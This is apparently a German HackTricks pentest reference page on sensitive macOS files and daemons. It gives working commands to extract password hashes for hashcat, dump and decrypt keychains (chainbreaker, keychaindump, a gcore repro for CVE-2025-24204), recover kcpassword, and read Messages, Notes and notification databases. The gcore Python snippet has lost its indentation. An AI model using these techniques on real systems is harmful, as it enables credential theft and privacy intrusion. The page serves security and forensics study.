# macOS Sensitive Locations & Interessante Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Passwörter

### Shadow Passwörter

Das Shadow-Passwort wird mit der Benutzerkonfiguration in plists gespeichert, die sich in **`/var/db/dslocal/nodes/Default/users/`** befinden.\
Der folgende One-Liner kann verwendet werden, um **alle Informationen über die Benutzer** auszulesen (einschließlich Hash-Info):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte wie dieses**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses hier**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in das **hashcat**-**Format** zu konvertieren.

Eine alternative One-Liner, die die Credentials aller Nicht-Service-Accounts im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Eine andere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, ist die Verwendung von `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Diese Datei wird **nur verwendet**, wenn das System in **Single-User-Mode** läuft (also nicht sehr häufig).

### Keychain Dump

Beachte, dass beim Verwenden des security-Binaries zum **entschlüsselten Dump der Passwörter** mehrere Abfragen den Benutzer darum bitten werden, diesen Vorgang zu erlauben.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Auf modernen macOS-Systemen sind die interessantesten Backing Stores normalerweise **`~/Library/Keychains/login.keychain-db`** und **`/Library/Keychains/System.keychain`**. Es handelt sich um SQLite-basierte Dateien, aber der Klartextzugriff wird weiterhin von **`securityd`** vermittelt: Das Stehlen der rohen DB liefert dir hauptsächlich Metadaten und verschlüsselte Blobs, es sei denn, du stellst auch das Passwort des Benutzers, `SystemKey` oder einen In-Memory-Master-Key wieder her.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basierend auf diesem Kommentar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) sieht es so aus, als würden diese Tools in Big Sur nicht mehr funktionieren.

### Keychaindump Overview

Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Keychains zu extrahieren, aber es stößt auf Einschränkungen bei neueren macOS-Versionen wie Big Sur, wie in einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) angedeutet wird. Die Nutzung von **keychaindump** erfordert, dass der Angreifer Zugriff erlangt und Privilegien zu **root** eskaliert. Das Tool nutzt aus, dass die Keychain der Einfachheit halber standardmäßig beim Benutzer-Login entsperrt wird, sodass Anwendungen ohne wiederholte Passwortabfrage darauf zugreifen können. Wenn ein Benutzer jedoch die Keychain nach jeder Verwendung sperrt, wird **keychaindump** wirkungslos.

**Keychaindump** arbeitet, indem es einen bestimmten Prozess namens **securityd** ins Visier nimmt, den Apple als Daemon für Autorisierungs- und kryptografische Operationen beschreibt, der für den Zugriff auf die Keychain entscheidend ist. Der Extraktionsprozess umfasst das Identifizieren eines **Master Key**, der aus dem Login-Passwort des Benutzers abgeleitet wird. Dieser Key ist wesentlich, um die Keychain-Datei lesen zu können. Um den **Master Key** zu finden, scannt **keychaindump** den Speicher-Heap von **securityd** mit dem `vmmap`-Befehl und sucht nach möglichen Keys in Bereichen, die als `MALLOC_TINY` markiert sind. Der folgende Befehl wird verwendet, um diese Speicherorte zu untersuchen:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nachdem potenzielle Master Keys identifiziert wurden, durchsucht **keychaindump** die Heaps nach einem bestimmten Muster (`0x0000000000000018`), das auf einen Kandidaten für den Master Key hinweist. Weitere Schritte, einschließlich Deobfuskation, sind erforderlich, um diesen Key zu verwenden, wie im Source Code von **keychaindump** beschrieben. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die entscheidenden Daten zum Entschlüsseln des keychain im Speicher des **securityd**-Prozesses gespeichert sind. Ein Beispielbefehl zum Ausführen von **keychaindump** ist:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um die folgenden Arten von Informationen aus einem OSX-Keychain auf forensisch saubere Weise zu extrahieren:

- Gehashtes Keychain-Passwort, geeignet zum Cracking mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Mit dem Keychain-Entsperrpasswort, einem Master Key, der mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) gewonnen wurde, oder einer Unlock-Datei wie SystemKey, liefert Chainbreaker auch Klartext-Passwörter.

Ohne eine dieser Methoden zum Entsperren der Keychain zeigt Chainbreaker alle anderen verfügbaren Informationen an.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Schlüsselbund-Schlüssel (mit Passwörtern) mit SystemKey dumpen**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain-Keys (mit Passwörtern) mit Memory-Dump dumpen**

[Folge diesen Schritten](../index.html#dumping-memory-with-osxpmem), um einen **Memory-Dump** durchzuführen
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain-Keys (mit Passwörtern) mit dem Benutzerpasswort dumpen**

Wenn du das Benutzerpasswort kennst, kannst du es verwenden, um **Keychains zu dumpen und zu entschlüsseln, die dem Benutzer gehören**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain-Master-Key über `gcore`-Entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) lieferte `/usr/bin/gcore` mit dem **`com.apple.system-task-ports.read`**-Entitlement aus, sodass jeder lokale Admin (oder eine bösartig signierte App) **jedes Prozessspeicherabbild auch bei aktiviertem SIP/TCC** dumpen konnte. Das Dumpen von `securityd` leakt den **Keychain-Master-Key** im Klartext und ermöglicht dir, `login.keychain-db` ohne das Benutzerpasswort zu entschlüsseln.

**Schneller Repro auf verwundbaren Builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extrahierten Hex-Schlüssel an Chainbreaker (`--key <hex>`) weiter, um den Login-Keychain zu entschlüsseln. Apple hat die Entitlement in **macOS 15.3+** entfernt, daher funktioniert das nur auf ungepatchten Sequoia-Builds oder Systemen, die das verwundbare Binary behalten haben.

### kcpassword

Die Datei **kcpassword** ist eine Datei, die das **Login-Passwort des Benutzers** enthält, aber nur, wenn der Systembesitzer das **automatische Login aktiviert** hat. Daher wird der Benutzer automatisch eingeloggt, ohne nach einem Passwort gefragt zu werden (was nicht sehr sicher ist).

Das Passwort wird in der Datei **`/etc/kcpassword`** gespeichert und mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** xor-verknüpft. Wenn das Passwort des Benutzers länger als der Schlüssel ist, wird der Schlüssel erneut verwendet.\
Dadurch lässt sich das Passwort recht leicht wiederherstellen, zum Beispiel mit Skripten wie [**diesem hier**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Informationen in Datenbanken

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Vor **Sequoia** kannst du den Notification-Center-Store normalerweise in **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** finden. In **Sequoia+** hat Apple ihn in den TCC-geschützten Group Container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** verschoben.

Der Großteil der interessanten Informationen wird in **blob**-Spalten gespeichert, daher musst du diesen Inhalt extrahieren und in etwas für Menschen Lesbares umwandeln (`plutil -p -`, `strings` oder ein kleiner Parser). Schnelle Triaging-Beispiele:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Aktuelle Datenschutzprobleme (NotificationCenter DB)

- In macOS **14.7–15.1** hat Apple Banner-Inhalte in der `db2/db` SQLite ohne ordnungsgemäße Redaction gespeichert. Die CVEs **CVE-2024-44292/44293/40838/54504** erlaubten es jedem lokalen Benutzer, den Notification-Text anderer Benutzer einfach durch Öffnen der DB zu lesen (kein TCC-Prompt).
- Apple hat das gemindert, indem die DB in `group.com.apple.usernoted` verschoben und auf neueren Sequoia-Builds mit TCC geschützt wurde, sodass man auf aktuellen Systemen normalerweise den richtigen Benutzerkontext oder einen TCC bypass braucht, um sie zu lesen.
- Auf Legacy-Endpunkten solltest du die Dateien `db`, `db-wal` und `db-shm` zusammen kopieren, bevor du updatest oder rebootest, wenn du die Artefakte erhalten willst.

### Notes

Die Benutzer-**notes** finden sich in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Wenn die obige One-Liner zu viel Rauschen erzeugt, exportiere `ZICNOTEDATA.ZDATA`, entpacke es mit gunzip und parse das protobuf: Das ist normalerweise zuverlässiger als `strings` direkt auf der SQLite auszuführen.

### Background Tasks / Login Items

Seit **Ventura** werden vom Benutzer genehmigte Login Items und mehrere Background Tasks in **BTM**-Stores wie **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** und dem versionierten System-Cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** nachverfolgt.

Diese Dateien sind nützlich, um Persistence, Helper-Tools und einige von MDM verwaltete Background Items schnell zu identifizieren:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Für den Persistence-Aspekt und die BTM-Internals siehe [the auto-start locations page](../../macos-auto-start-locations.md#login-items) und [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

In macOS-Apps befinden sich Preferences in **`$HOME/Library/Preferences`** und in iOS unter `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS kann das cli-Tool **`defaults`** verwendet werden, um **die Preferences-Datei zu ändern**.

**`/usr/sbin/cfprefsd`** beansprucht die XPC-Services `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Preferences auszuführen.

## OpenDirectory permissions.plist

Die Datei `/System/Library/OpenDirectory/permissions.plist` enthält Berechtigungen, die auf Knotenattribute angewendet werden, und ist durch SIP geschützt.\
Diese Datei gewährt bestimmten Benutzern anhand ihrer UUID (und nicht ihrer uid) Berechtigungen, sodass sie auf bestimmte sensible Informationen wie `ShadowHashData`, `HeimdalSRPKey` und `KerberosKeys` unter anderem zugreifen können:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Der Haupt-Daemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den `com.apple.system.notification_center` Mach-Port registrieren (prüfe sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon ist mit der Datei `/etc/notify.conf` konfigurierbar.

Die für Benachrichtigungen verwendeten Namen sind eindeutige Reverse-DNS-Bezeichnungen, und wenn eine Benachrichtigung an einen von ihnen gesendet wird, erhalten die Client(s), die angegeben haben, dass sie sie verarbeiten können, sie.

Es ist möglich, den aktuellen Status auszugeben (und alle Namen zu sehen), indem man dem notifyd-Prozess das Signal SIGUSR2 sendet und die generierte Datei liest: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Das **Distributed Notification Center**, dessen Haupt-Binary **`/usr/sbin/distnoted`** ist, ist eine weitere Möglichkeit, Benachrichtigungen zu senden. Es stellt einige XPC-Services bereit und führt einige Prüfungen durch, um Clients zu verifizieren.

### Apple Push Notifications (APN)

In diesem Fall können sich Anwendungen für **topics** registrieren. Der Client generiert ein Token, indem er die Server von Apple über **`apsd`** kontaktiert.\
Dann haben auch Provider ein Token generiert und können sich mit den Servern von Apple verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, das die Benachrichtigung an die darauf wartende Anwendung weiterleitet.

Die Preferences befinden sich in `/Library/Preferences/com.apple.apsd.plist`.

Es gibt eine lokale Datenbank mit Nachrichten, die sich in macOS in `/Library/Application\ Support/ApplePushService/aps.db` und in iOS in `/var/mobile/Library/ApplePushService` befindet. Sie hat 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Es ist auch möglich, Informationen über den Daemon und Verbindungen mit Folgendem zu erhalten:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

Dies sind Benachrichtigungen, die der User auf dem Bildschirm sehen soll:

- **`CFUserNotification`**: Diese API bietet eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
- **The Bulletin Board**: Dies zeigt in iOS ein Banner an, das verschwindet und in der Notification Center gespeichert wird.
- **`NSUserNotificationCenter`**: Dies ist das iOS bulletin board in MacOS. In älteren macOS-Releases liegt die Datenbank normalerweise in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; auf Sequoia+ wurde sie nach `~/Library/Group Containers/group.com.apple.usernoted/db2/db` verschoben.

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
